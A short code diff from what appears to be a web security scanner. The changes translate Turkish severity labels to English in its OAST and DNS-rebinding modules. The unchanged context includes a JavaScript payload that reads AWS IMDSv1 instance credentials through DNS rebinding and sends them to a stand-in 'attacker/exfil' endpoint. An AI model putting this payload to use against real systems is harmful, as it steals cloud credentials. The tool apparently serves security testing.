@@ -1,4 +1,4 @@
-from __future__ import annotations
+﻿from __future__ import annotations
 import asyncio
 import base64
 import contextlib
@@ -565,7 +565,7 @@ def run_oast_on_target(
             )
             results.append({
                 "type": "OAST",
-                "severity": "Yüksek",
+                "severity": "High",
                 "url": att["url"],
                 "param": att["param"],
                 "injected": att["injected"],
@@ -995,7 +995,7 @@ class OASTCorrelationEngine:
                 "latency_ms": latency_ms,
                 "protocol_detected": event.get("protocol", injection.get("protocol", "unknown")),
                 "remote_address": event.get("remote-address", event.get("remote_address", "")),
-                "severity": "Yüksek",
+                "severity": "High",
                 "confidence": 1.0,
                 "confidence_label": "Confirmed",
             }
@@ -1167,7 +1167,7 @@ class DNSRebindingAttacker:
                 f"{rbndr}/latest/meta-data/iam/security-credentials/${{role}}`)"
                 ".then(r=>r.text()).then(creds=>fetch('http://attacker/exfil?c='+btoa(creds))))"
             ),
-            "severity": "Kritik",
+            "severity": "Critical",
             "description": "DNS rebinding to extract AWS IMDSv1 credentials from browser",
         }
 
